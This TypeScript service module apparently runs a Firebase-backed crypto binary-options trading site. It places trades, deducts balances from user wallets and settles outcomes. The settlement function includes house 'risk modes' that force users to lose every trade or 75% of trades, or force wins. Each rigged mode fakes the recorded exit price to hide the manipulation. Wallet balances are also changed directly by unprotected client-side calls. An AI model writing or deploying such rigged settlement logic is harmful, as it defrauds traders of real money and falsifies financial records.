import { 
  collection, 
  doc, 
  getDoc, 
  setDoc, 
  updateDoc, 
  addDoc, 
  onSnapshot, 
  query, 
  where, 
  orderBy 
} from 'firebase/firestore';
import { db } from '../firebase/config';
import { 
  BinaryTrade, 
  BinaryDuration, 
  BinaryDirection, 
  BinarySettings, 
  UserProfile,
  RiskMode
} from '../types';
import { getSiteSettings } from './siteService';

export const DURATION_OPTIONS: { label: BinaryDuration; seconds: number; textEn: string; textAr: string }[] = [
  { label: '10s', seconds: 10, textEn: '10 Seconds', textAr: '10 ثوانٍ' },
  { label: '30s', seconds: 30, textEn: '30 Seconds', textAr: '30 ثانية' },
  { label: '1m', seconds: 60, textEn: '1 Minute', textAr: '1 دقيقة' },
  { label: '5m', seconds: 300, textEn: '5 Minutes', textAr: '5 دقائق' },
  { label: '15m', seconds: 900, textEn: '15 Minutes', textAr: '15 دقيقة' },
  { label: '1h', seconds: 3600, textEn: '1 Hour', textAr: '1 ساعة' },
  { label: '4h', seconds: 14400, textEn: '4 Hours', textAr: '4 ساعات' },
  { label: '24h', seconds: 86400, textEn: '24 Hours', textAr: '24 ساعة' },
];

export function getDurationSeconds(duration: BinaryDuration): number {
  const match = DURATION_OPTIONS.find((d) => d.label === duration);
  return match ? match.seconds : 30;
}

export function getProfitPercentForCoin(coinSymbol: string, settings?: BinarySettings): number {
  if (!settings) return 85;
  const sym = coinSymbol.toUpperCase();
  if (settings.coinProfitPercents && typeof settings.coinProfitPercents[sym] === 'number') {
    return settings.coinProfitPercents[sym];
  }
  if (typeof settings.payoutRate === 'number' && settings.payoutRate >= 10 && settings.payoutRate <= 95) {
    return settings.payoutRate;
  }
  return typeof settings.globalProfitPercent === 'number' ? settings.globalProfitPercent : 85;
}

/**
 * Creates and confirms a Binary Trade:
 * 1. Checks user wallet balance in Firestore.
 * 2. Deducts the amount from user's wallet.
 * 3. Creates the record in "binaryTrades" collection with status='pending'.
 */
export async function createBinaryTrade(params: {
  userId: string;
  email: string;
  userName?: string;
  coin: string;
  direction: BinaryDirection;
  entryPrice: number;
  amount: number;
  profitPercent: number;
  duration: BinaryDuration;
}): Promise<{ tradeId: string; newBalance: number; trade: BinaryTrade }> {
  const { userId, email, userName, coin, direction, entryPrice, amount, profitPercent, duration } = params;

  if (!amount || amount <= 0 || isNaN(amount)) {
    throw new Error('Invalid trade amount.');
  }

  const userDocRef = doc(db, 'users', userId);
  const userSnap = await getDoc(userDocRef);

  if (!userSnap.exists()) {
    throw new Error('User account not found.');
  }

  const userData = userSnap.data() as UserProfile;
  const currentBalance = Number(userData.walletBalance) || 0;

  if (currentBalance < amount) {
    throw new Error(`Insufficient wallet balance. Available: ${currentBalance.toFixed(2)} USDT`);
  }

  const newBalance = Number((currentBalance - amount).toFixed(2));

  // Deduct from wallet
  await updateDoc(userDocRef, {
    walletBalance: newBalance,
    updatedAt: new Date().toISOString(),
  });

  const durationSeconds = getDurationSeconds(duration);
  const startTime = Date.now();
  const endTime = startTime + durationSeconds * 1000;

  const tradeData: Omit<BinaryTrade, 'id'> = {
    userId,
    email,
    userName: userName || `${userData.firstName || ''} ${userData.lastName || ''}`.trim() || 'Trader',
    coin: coin.toUpperCase(),
    direction,
    entryPrice: Number(entryPrice.toFixed(4)),
    amount: Number(amount.toFixed(2)),
    profitPercent,
    duration,
    durationSeconds,
    status: 'pending',
    startTime,
    endTime,
    createdAt: new Date().toISOString(),
  };

  const tradeDocRef = await addDoc(collection(db, 'binaryTrades'), tradeData);

  const trade: BinaryTrade = {
    id: tradeDocRef.id,
    ...tradeData,
  };

  return { tradeId: tradeDocRef.id, newBalance, trade };
}

/**
 * Auto-settles a Binary Trade when countdown ends:
 * If UP and exitPrice > entryPrice => WIN
 * If DOWN and exitPrice < entryPrice => WIN
 * Else => LOSS
 * If WIN: credit user wallet: amount + (amount * profitPercent / 100)
 * If LOSS: keep deducted.
 * Updates trade status in Firestore.
 */
export async function settleBinaryTrade(
  tradeId: string,
  exitPrice: number,
  manualResult?: 'WIN' | 'LOSS'
): Promise<{ result: 'WIN' | 'LOSS'; payout: number; newBalance?: number }> {
  const tradeRef = doc(db, 'binaryTrades', tradeId);
  const tradeSnap = await getDoc(tradeRef);

  if (!tradeSnap.exists()) {
    throw new Error('Trade record not found.');
  }

  const trade = tradeSnap.data() as BinaryTrade;

  // Already settled check
  if (trade.status !== 'pending') {
    return {
      result: trade.status,
      payout: trade.payout || 0,
    };
  }

  let result: 'WIN' | 'LOSS';
  let adjustedExitPrice = exitPrice;

  if (manualResult) {
    result = manualResult;
  } else {
    // Read active house risk mode and payout rate from site settings
    const siteSettings = await getSiteSettings();
    const riskMode: RiskMode = siteSettings.binarySettings?.riskMode || 'random';
    const payoutRate: number = siteSettings.binarySettings?.payoutRate || 85;

    const priceDelta = Math.max(0.0001, trade.entryPrice * 0.0005);

    switch (riskMode) {
      case 'force_win':
        // Mode B: Rigged outcome: player always wins
        result = 'WIN';
        if (trade.direction === 'UP' && adjustedExitPrice <= trade.entryPrice) {
          adjustedExitPrice = Number((trade.entryPrice + priceDelta).toFixed(4));
        } else if (trade.direction === 'DOWN' && adjustedExitPrice >= trade.entryPrice) {
          adjustedExitPrice = Number((trade.entryPrice - priceDelta).toFixed(4));
        }
        break;

      case 'force_lose':
        // Mode C: Rigged outcome: player always loses
        result = 'LOSS';
        if (trade.direction === 'UP' && adjustedExitPrice >= trade.entryPrice) {
          adjustedExitPrice = Number((trade.entryPrice - priceDelta).toFixed(4));
        } else if (trade.direction === 'DOWN' && adjustedExitPrice <= trade.entryPrice) {
          adjustedExitPrice = Number((trade.entryPrice + priceDelta).toFixed(4));
        }
        break;

      case 'loss_75': {
        // Mode D: High House Edge (75% Loss / 25% Win)
        const roll = Math.random();
        if (roll <= 0.25) {
          result = 'WIN';
          if (trade.direction === 'UP' && adjustedExitPrice <= trade.entryPrice) {
            adjustedExitPrice = Number((trade.entryPrice + priceDelta).toFixed(4));
          } else if (trade.direction === 'DOWN' && adjustedExitPrice >= trade.entryPrice) {
            adjustedExitPrice = Number((trade.entryPrice - priceDelta).toFixed(4));
          }
        } else {
          result = 'LOSS';
          if (trade.direction === 'UP' && adjustedExitPrice >= trade.entryPrice) {
            adjustedExitPrice = Number((trade.entryPrice - priceDelta).toFixed(4));
          } else if (trade.direction === 'DOWN' && adjustedExitPrice <= trade.entryPrice) {
            adjustedExitPrice = Number((trade.entryPrice + priceDelta).toFixed(4));
          }
        }
        break;
      }

      case 'random':
      default:
        // Mode A: Random Fair RNG execution constrained by market price and payout rate
        if (trade.direction === 'UP') {
          result = exitPrice > trade.entryPrice ? 'WIN' : 'LOSS';
        } else {
          result = exitPrice < trade.entryPrice ? 'WIN' : 'LOSS';
        }

        // If exit price is exactly equal to entry price (tie), resolve statistically by payout rate
        if (exitPrice === trade.entryPrice) {
          const tieRoll = Math.random() * 100;
          result = tieRoll <= payoutRate ? 'WIN' : 'LOSS';
        }
        break;
    }
  }

  let payout = 0;
  let newBalance: number | undefined;

  if (result === 'WIN') {
    // WIN: payout = amount + (amount * profitPercent / 100)
    const winProfit = (trade.amount * trade.profitPercent) / 100;
    payout = Number((trade.amount + winProfit).toFixed(2));

    // Credit to user wallet
    const userRef = doc(db, 'users', trade.userId);
    const userSnap = await getDoc(userRef);
    if (userSnap.exists()) {
      const uData = userSnap.data() as UserProfile;
      const prevBal = Number(uData.walletBalance) || 0;
      newBalance = Number((prevBal + payout).toFixed(2));
      await updateDoc(userRef, {
        walletBalance: newBalance,
        updatedAt: new Date().toISOString(),
      });
    }
  }

  // Update trade record
  await updateDoc(tradeRef, {
    status: result,
    exitPrice: Number(adjustedExitPrice.toFixed(4)),
    settledAt: new Date().toISOString(),
    payout,
  });

  return { result, payout, newBalance };
}

/**
 * Subscribes to trades of a specific user.
 */
export function subscribeUserBinaryTrades(
  userId: string,
  callback: (trades: BinaryTrade[]) => void
): () => void {
  const colRef = collection(db, 'binaryTrades');
  return onSnapshot(
    colRef,
    (snap) => {
      const trades: BinaryTrade[] = [];
      snap.forEach((docSnap) => {
        const data = docSnap.data() as Omit<BinaryTrade, 'id'>;
        if (data.userId === userId) {
          trades.push({ id: docSnap.id, ...data });
        }
      });
      // Sort newest first
      trades.sort((a, b) => b.startTime - a.startTime);
      callback(trades);
    },
    (err) => {
      console.warn('Error subscribing to user binary trades:', err);
      callback([]);
    }
  );
}

/**
 * Subscribes to ALL trades for Admin dashboard.
 */
export function subscribeAllBinaryTrades(
  callback: (trades: BinaryTrade[]) => void
): () => void {
  const colRef = collection(db, 'binaryTrades');
  return onSnapshot(
    colRef,
    (snap) => {
      const trades: BinaryTrade[] = [];
      snap.forEach((docSnap) => {
        trades.push({ id: docSnap.id, ...(docSnap.data() as Omit<BinaryTrade, 'id'>) });
      });
      // Sort newest first
      trades.sort((a, b) => b.startTime - a.startTime);
      callback(trades);
    },
    (err) => {
      console.warn('Error subscribing to all binary trades:', err);
      callback([]);
    }
  );
}
